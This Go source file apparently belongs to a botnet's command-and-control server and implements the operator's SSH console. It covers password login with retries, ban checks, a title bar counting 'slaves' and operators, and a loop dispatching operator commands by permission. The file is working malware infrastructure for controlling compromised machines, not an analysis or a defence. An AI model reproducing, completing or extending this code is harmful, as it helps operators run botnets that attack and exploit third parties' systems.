package master

import (
	"encoding/hex"
	"errors"
	"fmt"
	"server/core/master/command"
	"server/core/master/database"
	"server/core/master/encryption"
	"server/core/master/session/sessions"
	"server/core/master/session/sshSession"
	"server/core/master/utility/terminal"
	"server/core/slave"
	"strings"
	"time"

	"github.com/briandowns/spinner"
	"github.com/mattn/go-shellwords"
	"golang.org/x/crypto/ssh"
)

type Master struct {
	*sshSession.SecureShellSession
	Channel ssh.Channel
}

func (master Master) Close(session *sessions.Session) {
	session.Remove()
	err := session.Close()
	if err != nil {
		return
	}
}
func (master Master) Handle() {
	// Gets the user from the database
	//
	ssh := master.GetConnection()
	user := database.DatabaseConnection.GetInfoByName(master.GetConnection().User())
	session := &sessions.Session{
		SecureShellSession: master.SecureShellSession,
		User:               user,
		Created:            time.Now(),
	}
	if ssh.Permissions.Extensions != nil {
		if ssh.Permissions.Extensions["authorized"] == "false" {
			if err := LoginPage(session); err != nil {
				session.Close()
				return
			}
		}
	}
	// Creates a terminal
	term := terminal.NewTerminal(master.Channel, "\033[97m"+user.Name+"\033[91m@\033[97mКомару\033[91m: \033[97m")
	// Creates the session variable
	err := sessions.New(session)
	// Checks if the user is already online with the same name
	if err != nil {
		if !user.Admin {
			session.Println("A user with the same name is already connected to the command and control.")
			session.Read("")
			err := master.Channel.Close()
			if err != nil {
				return
			}
			return
		}
	}
	defer master.Close(session)

	go func() {
		for {
			// Updates the user
			user = database.DatabaseConnection.GetInfoByName(master.GetConnection().User())
			if user == nil {
				continue
			}
			session.User = user
			time.Sleep(30 * time.Second)
		}
	}()
	go func() {
		for {
			// Checks if the user is nil
			if user == nil {
				continue
			}

			// Sets the title
			err := session.PrintTitle(fmt.Sprintf("%d slaves | %d operator(s)", slave.List.BotCounter(), sessions.Count()))
			if err != nil {
				return
			}

			// Checks if the user is banned
			if user.Banned {
				master.SecureShellSession.Close()
				return
			}

			// Waits a second
			time.Sleep(200 * time.Millisecond)
		}
	}()

	// Checks if user is banned and if the user is banned it shows the banned prompt.
	if user.Banned {
		session.Clear()
		session.Println("Your access to the command and control has been revoked by an administrator.")
		return
	}

	s := spinner.New(spinner.CharSets[9], 100*time.Millisecond) // Build our new spinner
	session.Clear()
	s.Writer = session.GetReadWriter()
	s.Prefix = "\033[97mPlease wait.. \u001B[91m"
	s.Start()
	time.Sleep(2 * time.Second)
	s.Stop()

	// Command Handling
	session.Clear()
	session.Println()
	for {
		line, err := term.ReadLine()
		if err != nil {
			return
		}

		if strings.Trim(line, " ") == "" {
			continue
		}

		args, err := shellwords.Parse(line)
		if err != nil {
			continue
		}

		cmd := command.Get(args[0])
		if cmd == nil {
			session.Println("cmd not found")
			continue
		}
		if !cmd.HasPermission(session.User) {
			session.Println("Not enough permissions!")
			continue
		}
		args = args[1:]
		cmd.Executor(args, session)
	}
}

func LoginPage(s *sessions.Session) error {
	ssh := s.GetConnection()
	term := terminal.NewTerminal(s.GetChannel(), "\033[97m[password\033[97m]>")
	//pass, err := term.ReadLine()
	//if err != nil {
	//	return err
	//}
	//if err := database.DatabaseConnection.VerifyCredentials(ssh.User(), pass); err == nil {
	//	ssh.Permissions.Extensions["authorized"] = "true"
	//	user.Pubkey = []byte(hex.EncodeToString([]byte(ssh.Permissions.Extensions["pub-key"])))
	//	database.DatabaseConnection.SetUser(user)
	//	term = nil
	//}
	user := database.DatabaseConnection.GetInfoByName(s.GetConnection().User())

	for attempts := 0; attempts <= 3; attempts++ {

		if err := s.Clear(); err != nil {
			return err
		}

		password, err := term.ReadLine()
		if err != nil {
			return err
		}

		if err := s.Write([]byte("\x1b[0m\r\n")); err != nil {
			return err
		}

		if user == nil {
			s.Println("Invalid User!")
			s.Close()
		} else {
			if encryption.Compare(password, user.Password) {
				s.User = user
				ssh.Permissions.Extensions["authorized"] = "true"
				s.User.Pubkey = []byte(hex.EncodeToString([]byte(ssh.Permissions.Extensions["pub-key"])))
				database.DatabaseConnection.SetUser(user)
				term = nil
				if user.Banned {
					s.Close()
				}

				return nil
			}
		}

		s.Println("\x1b[0m                                > Incorrect login ")

		if attempts == 3-1 {
			break
		}

		cooldown := 3
		for i := 0; i <= cooldown; i++ {
			s.Write([]byte(fmt.Sprintf("\r\x1b[0m                                > Retry in %d seconds", cooldown-i)))
			time.Sleep(time.Second)
		}

	}

	return errors.New("unathorized")
}
